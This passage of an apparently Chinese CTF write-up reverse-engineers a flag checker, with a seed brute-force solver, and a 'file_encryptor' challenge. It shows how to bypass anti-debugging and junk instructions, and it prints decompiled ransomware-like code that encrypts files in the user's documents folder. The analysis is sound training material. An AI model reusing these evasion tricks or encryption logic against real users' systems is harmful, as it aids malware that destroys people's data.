class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v6[<span class="hljs-number">44</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-60h] BYREF</span><br>  __int64 v7[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+D0h] [rbp+50h] BYREF</span><br>  __int64 v8[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+E0h] [rbp+60h] BYREF</span><br>  __int64 v9[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+F0h] [rbp+70h] BYREF</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [rsp+104h] [rbp+84h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> Seed; <span class="hljs-comment">// [rsp+108h] [rbp+88h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10Ch] [rbp+8Ch]</span><br><br>  sub_40AAA0(argc, argv, envp);<br>  Seed = time64(<span class="hljs-number">0</span>i64);<br>  srand(Seed);<br>  sub_4479D0(v7);<br>  <span class="hljs-built_in">cout</span>(&amp;qword_47E800, aInputYourFlag);<br>  <span class="hljs-built_in">cin</span>(&amp;qword_47E4A0, v7);<br>  sub_4478C0(v9, v7);<br>  enc((__int64)v8, (__int64)v9);<br>  sub_447E00((__int64)v7, (__int64)v8);<br>  sub_447D50(v8);<br>  sub_447D50(v9);<br>  <span class="hljs-keyword">if</span> ( str_len(v7) != <span class="hljs-number">42</span> )<br>  &#123;<br>    v3 = <span class="hljs-built_in">cout</span>(&amp;qword_47E800, aLenError);<br>    ((<span class="hljs-type">void</span> (__fastcall *)(__int64))sub_464AC0)(v3);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  qmemcpy(v6, dword_46A020, <span class="hljs-number">0xA8</span>ui64);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">41</span>; ++i )<br>  &#123;<br>    v10 = rand() % <span class="hljs-number">255</span>;<br>    v4 = (<span class="hljs-type">char</span> *)str_index(v7, i);<br>    <span class="hljs-keyword">if</span> ( (v10 ^ *v4) != v6[i] )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  sub_447D50(v7);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>enc对输入flag做加密，最后与随机数异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 *__fastcall <span class="hljs-title function_">enc</span><span class="hljs-params">(__int64 *a1, __int64 a2)</span><br>&#123;<br>  v7[<span class="hljs-number">5</span>] = (__int64)v6;<br>  v13 = <span class="hljs-number">3</span>;<br>  nullsub_2(&amp;v6[<span class="hljs-number">95</span>]);<br>  sub_447820(a1, &amp;qword_47F000, &amp;v8);<br>  nullsub_3(&amp;v8);<br>  len = str_len(a2);<br>  v11 = len - <span class="hljs-number">1</span>i64;<br>  v7[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>i64;<br>  v2 = len;<br>  v10 = v13 - <span class="hljs-number">1</span>i64;<br>  v7[<span class="hljs-number">0</span>] = v11;<br>  v7[<span class="hljs-number">2</span>] = len;<br>  v7[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>i64;<br>  v3 = alloca(sub_40B290(((<span class="hljs-type">unsigned</span> __int64)v13 * (<span class="hljs-type">unsigned</span> __int128)(<span class="hljs-type">unsigned</span> __int64)len) &gt;&gt; <span class="hljs-number">64</span>));<br>  v9 = v7;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v13; ++i )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; len; ++j )<br>      *((_BYTE *)v9 + j + v2 * i) = <span class="hljs-number">10</span>;<br>  &#125;<br>  v18 = <span class="hljs-number">0</span>;<br>  v17 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; len; ++k )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !v18 || v13 - <span class="hljs-number">1</span> == v18 )<br>      v17 ^= <span class="hljs-number">1u</span>;<br>    v4 = (_BYTE *)str_index(a2, k);<br>    *((_BYTE *)v9 + k + v2 * v18) = *v4;<br>    <span class="hljs-keyword">if</span> ( v17 )<br>      ++v18;<br>    <span class="hljs-keyword">else</span><br>      --v18;<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt; v13; ++m )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt; len; ++n )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *((_BYTE *)v9 + n + v2 * m) != <span class="hljs-number">10</span> )<br>        sub_447F10(a1, *((_BYTE *)v9 + n + v2 * m));<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> a1;<br>&#125;<br></code></pre></td></tr></table></figure><p>enc看起来比较麻烦，实际上是置换操作，将输入打乱，让输入的42个字符两两不同，把置换规则跑出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">inp = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>)]<br>l = <span class="hljs-built_in">len</span>(inp)<br><br>ls = [<span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>*l)]<br><br>v18 = <span class="hljs-number">0</span><br>v17 = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>    <span class="hljs-keyword">if</span> ((v18 == <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> (v18 == <span class="hljs-number">2</span>)):<br>        v17 ^= <span class="hljs-number">1</span><br>    ls[i + l * v18] = inp[i]<br>    <span class="hljs-keyword">if</span> (v17):<br>        v18 += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        v18 -= <span class="hljs-number">1</span><br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">0xff</span> <span class="hljs-keyword">in</span> ls):<br>    ls.remove(<span class="hljs-number">0xff</span>)<br><br><span class="hljs-built_in">print</span>(ls)<br><span class="hljs-comment"># [0, 4, 8, 12, 16, 20, 24, 28, 32, 36, 40, 1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35, 37, 39, 41, 2, 6, 10, 14, 18, 22, 26, 30, 34, 38]</span><br></code></pre></td></tr></table></figure><p>随机数种子爆破</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">uint8_t</span> ans[] = &#123;<span class="hljs-number">0x09</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x08</span>&#125;;<br><br><span class="hljs-type">uint8_t</span> ls[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span>, <span class="hljs-number">20</span>, <span class="hljs-number">24</span>, <span class="hljs-number">28</span>, <span class="hljs-number">32</span>, <span class="hljs-number">36</span>, <span class="hljs-number">40</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>, <span class="hljs-number">21</span>, <span class="hljs-number">23</span>, <span class="hljs-number">25</span>, <span class="hljs-number">27</span>, <span class="hljs-number">29</span>, <span class="hljs-number">31</span>, <span class="hljs-number">33</span>, <span class="hljs-number">35</span>, <span class="hljs-number">37</span>, <span class="hljs-number">39</span>, <span class="hljs-number">41</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">18</span>, <span class="hljs-number">22</span>, <span class="hljs-number">26</span>, <span class="hljs-number">30</span>, <span class="hljs-number">34</span>, <span class="hljs-number">38</span>&#125;;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// time_t time_stamp = 0x647AA836;</span><br>    <span class="hljs-type">time_t</span> time_stamp = <span class="hljs-number">0x64000000</span>;<br>    <span class="hljs-comment">// i = 0x4dc62a</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">time_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1000000</span>; i++)<br>    &#123;<br>        srand(time_stamp + i);<br>        <span class="hljs-type">uint8_t</span> tmp_flag[<span class="hljs-number">43</span>];<br>        tmp_flag[<span class="hljs-number">42</span>] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">42</span>; i++)<br>        &#123;<br>            tmp_flag[ls[i]] = ans[i] ^ (rand() % <span class="hljs-number">0xff</span>);<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(tmp_flag);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>拿到flag</p><p><img src="assets/2024-01-25-14-18-43-image.png"></p><h2 id="file-encryptor"><a href="#file-encryptor" class="headerlink" title="file_encryptor"></a>file_encryptor</h2><p>F5发现有问题</p><p><img src="assets/2024-01-25-14-21-42-image.png"></p><p><img src="assets/2024-01-25-14-22-37-image.png"></p><p>故意触发异常</p><p>调试发现还没运行到main函数就挂了</p><p>看导入表有导入函数<code>IsDebuggerPresent</code>，交叉引用</p><p><img src="assets/2024-01-25-14-27-10-image.png"></p><p><code>TlsCallback_0</code>里面有反调试</p><p><img src="assets/2024-01-25-14-28-02-image.png"></p><p>把jz patch成jmp</p><p>调试发现<code>TlsCallback_0</code>里面也有出发异常，pass之后跳到了<code>loc_C41916</code></p><p><img src="assets/2024-01-25-14-33-32-image.png"></p><p><img src="assets/2024-01-25-14-32-56-image.png"></p><p>直接在0x00C418ED用jmp跳到loc_C41916</p><p><img src="assets/2024-01-25-14-35-20-image.png"></p><p>再运行main处触发异常，pass之后跳到<code>loc_C619CC</code></p><p><img src="assets/2024-01-25-14-37-06-image.png"></p><p>patch一下</p><p><img src="assets/2024-01-25-14-38-31-image.png"></p><p>patch之后就能无痛F5了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v3; <span class="hljs-comment">// zf</span><br>  <span class="hljs-type">void</span> *Src; <span class="hljs-comment">// [esp+24h] [ebp-34h]</span><br>  HGLOBAL hResData; <span class="hljs-comment">// [esp+28h] [ebp-30h]</span><br>  HMODULE hModule; <span class="hljs-comment">// [esp+2Ch] [ebp-2Ch]</span><br>  HRSRC hResInfo; <span class="hljs-comment">// [esp+30h] [ebp-28h]</span><br>  DWORD Size; <span class="hljs-comment">// [esp+34h] [ebp-24h]</span><br>  DWORD i; <span class="hljs-comment">// [esp+38h] [ebp-20h]</span><br>  <span class="hljs-type">void</span> *v11; <span class="hljs-comment">// [esp+3Ch] [ebp-1Ch]</span><br><br>  hModule = GetModuleHandleW(<span class="hljs-number">0</span>);<br>  hResInfo = FindResourceW(hModule, (LPCWSTR)<span class="hljs-number">0x65</span>, <span class="hljs-string">L&quot;DATA&quot;</span>);<br>  sub_1112140();<br>  MEMORY[<span class="hljs-number">0x1E99782</span>]();<br>  <span class="hljs-keyword">if</span> ( !v3 )<br>  &#123;<br>    Size = SizeofResource(hModule, hResInfo);<br>    hResData = LoadResource(hModule, hResInfo);<br>    v11 = (<span class="hljs-type">void</span> *)sub_1112156(Size);<br>    <span class="hljs-keyword">if</span> ( hResData )<br>    &#123;<br>      Src = LockResource(hResData);<br>      <span class="hljs-keyword">if</span> ( Src )<br>      &#123;<br>        <span class="hljs-built_in">memcpy</span>(v11, Src, Size);<br>        <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; Size; ++i )<br>          *((_BYTE *)v11 + i) ^= <span class="hljs-number">0x33</span>u;<br>        dword_111541C = sub_1111CE0(v11, Size);<br>      &#125;<br>      FreeResource(hResData);<br>    &#125;<br>    j_j_free(v11);<br>  &#125;<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))loc_1111320)();<br>  sub_1112000();<br>  system(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>仔细看有怪东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">  sub_1112140();<br>  MEMORY[<span class="hljs-number">0x1E99782</span>]();<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sub_1112140</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> *retaddr; <span class="hljs-comment">// [esp+0h] [ebp+0h]</span><br><br>  ++retaddr;<br>&#125;<br><br> ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))loc_1221320)();<br></code></pre></td></tr></table></figure><p>主函数和<code>loc_1221320</code>里有花指令，nop掉，再F5就正常了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">void</span> *Src; <span class="hljs-comment">// [esp+24h] [ebp-34h]</span><br>  HGLOBAL hResData; <span class="hljs-comment">// [esp+28h] [ebp-30h]</span><br>  HMODULE hModule; <span class="hljs-comment">// [esp+2Ch] [ebp-2Ch]</span><br>  HRSRC hResInfo; <span class="hljs-comment">// [esp+30h] [ebp-28h]</span><br>  DWORD Size; <span class="hljs-comment">// [esp+34h] [ebp-24h]</span><br>  DWORD i; <span class="hljs-comment">// [esp+38h] [ebp-20h]</span><br>  <span class="hljs-type">void</span> *v10; <span class="hljs-comment">// [esp+3Ch] [ebp-1Ch]</span><br><br>  hModule = GetModuleHandleW(<span class="hljs-number">0</span>);<br>  hResInfo = FindResourceW(hModule, (LPCWSTR)<span class="hljs-number">0x65</span>, <span class="hljs-string">L&quot;DATA&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( hResInfo )<br>  &#123;<br>    Size = SizeofResource(hModule, hResInfo);<br>    hResData = LoadResource(hModule, hResInfo);<br>    v10 = (<span class="hljs-type">void</span> *)sub_1222156(Size);<br>    <span class="hljs-keyword">if</span> ( hResData )<br>    &#123;<br>      Src = LockResource(hResData);<br>      <span class="hljs-keyword">if</span> ( Src )<br>      &#123;<br>        <span class="hljs-built_in">memcpy</span>(v10, Src, Size);<br>        <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; Size; ++i )<br>          *((_BYTE *)v10 + i) ^= <span class="hljs-number">0x33</span>u;<br>        dword_122541C = sub_1221CE0(v10, Size);<br>      &#125;<br>      FreeResource(hResData);<br>    &#125;<br>    j_j_free(v10);<br>  &#125;<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>))sub_1221320)();<br>  sub_1222000();<br>  system(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>从资源节加载名字叫<code>DATA</code>的资源文件，然后异或0x33解密，调试然后dump下来，PE文件，看导入表可以看出来是加解密相关的dll</p><p><img src="assets/2024-01-25-14-48-34-image.png"></p><p><code>sub_1221CE0</code>应该是加载该dll的函数，运行完进程里多了<code>cryptsp.dll</code>，应该就是导入的dll</p><p>继续往后分析，<code>sub_1221320</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_1221320</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( !sub_1221050() )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  sub_1221000(&amp;byte_122501C, &amp;unk_1225018, <span class="hljs-built_in">strlen</span>(&amp;byte_122501C));<br>  <span class="hljs-keyword">return</span> sub_1221210(&amp;unk_1225414, &amp;unk_1225418, &amp;byte_122501C, <span class="hljs-built_in">strlen</span>(&amp;byte_122501C));<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">sub_1221050</span><span class="hljs-params">()</span><br>&#123;<br>  DWORD VolumeSerialNumber; <span class="hljs-comment">// [esp+4h] [ebp-8h] BYREF</span><br><br>  VolumeSerialNumber = <span class="hljs-number">0</span>;<br>  GetVolumeInformationA(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;VolumeSerialNumber, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( VolumeSerialNumber == <span class="hljs-number">2108366133</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2108366133</span>;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>里面检测磁盘序号，nop掉</p><p><code>sub_1221000</code>里面对字符串做操作，估计是密钥</p><p><code>sub_1221210</code>比较怪</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">v7 = (<span class="hljs-type">int</span> (__stdcall *)(_DWORD *, _DWORD, _DWORD, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>))sub_1221BB0(dword_122541C, (LPCSTR)<span class="hljs-number">2</span>);<br>v6 = (<span class="hljs-type">int</span> (__stdcall *)(_DWORD, <span class="hljs-type">int</span>, <span class="hljs-type">char</span> *, _DWORD))sub_1221BB0(dword_122541C, (LPCSTR)<span class="hljs-number">0x1E</span>);<br>v5 = (<span class="hljs-type">void</span> (__stdcall *)(_DWORD, _DWORD))sub_1221BB0(dword_122541C, (LPCSTR)<span class="hljs-number">0x1C</span>);<br></code></pre></td></tr></table></figure><p>v7的内容</p><p><img src="assets/2024-01-25-14-59-34-image.png"></p><p><img src="assets/2024-01-25-15-00-43-image.png"></p><p>刚好是<code>cryptsp.dll</code>里的第2个导出函数<code>CryptAcquireContextW</code>，<code>sub_F71BB0</code>应该是根据ordinal获取函数地址</p><p>把其他几个函数获取一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">CryptAcquireContextW = (<span class="hljs-type">int</span> (__stdcall *)(<span class="hljs-type">int</span> *, _DWORD, _DWORD, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>))sub_971BB0(dword_97541C, (LPCSTR)<span class="hljs-number">2</span>);<br>CryptSetKeyParam = (<span class="hljs-type">int</span> (__stdcall *)(_DWORD, <span class="hljs-type">int</span>, <span class="hljs-type">char</span> *, _DWORD))sub_971BB0(dword_97541C, (LPCSTR)<span class="hljs-number">0x1E</span>);<br>CryptReleaseContext = (<span class="hljs-type">void</span> (__stdcall *)(_DWORD, _DWORD))sub_971BB0(dword_97541C, (LPCSTR)<span class="hljs-number">0x1C</span>);<br></code></pre></td></tr></table></figure><p>调用这几个函数应该是初始化密钥</p><p>接着分析<code>sub_972000</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sub_F72000</span><span class="hljs-params">()</span><br>&#123;<br>  HANDLE hFindFile; <span class="hljs-comment">// [esp+0h] [ebp-874h]</span><br>  PWSTR ppszPath; <span class="hljs-comment">// [esp+4h] [ebp-870h] BYREF</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">WIN32_FIND_DATAW</span> <span class="hljs-title">FindFileData</span>;</span> <span class="hljs-comment">// [esp+8h] [ebp-86Ch] BYREF</span><br>  WCHAR v3[<span class="hljs-number">260</span>]; <span class="hljs-comment">// [esp+258h] [ebp-61Ch] BYREF</span><br>  WCHAR FileName[<span class="hljs-number">260</span>]; <span class="hljs-comment">// [esp+460h] [ebp-414h] BYREF</span><br>  WCHAR pszDest[<span class="hljs-number">260</span>]; <span class="hljs-comment">// [esp+668h] [ebp-20Ch] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( !SHGetKnownFolderPath(&amp;rfid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;ppszPath) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( PathCombineW(pszDest, ppszPath, <span class="hljs-string">L&quot;document&quot;</span>) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( PathCombineW(FileName, pszDest, <span class="hljs-string">L&quot;*.*&quot;</span>) )<br>      &#123;<br>        hFindFile = FindFirstFileW(FileName, &amp;FindFileData);<br>        <span class="hljs-keyword">if</span> ( hFindFile != (HANDLE)<span class="hljs-number">-1</span> )<br>        &#123;<br>          <span class="hljs-keyword">do</span><br>          &#123;<br>            <span class="hljs-keyword">if</span> ( FindFileData.cFileName[<span class="hljs-number">0</span>] != <span class="hljs-number">46</span> )<br>            &#123;<br>              PathCombineW(v3, pszDest, FindFileData.cFileName);<br>              sub_F717E0(FindFileData.cFileName, v3);<br>            &#125;<br>          &#125;<br>          <span class="hljs-keyword">while</span> ( FindNextFileW(hFindFile, 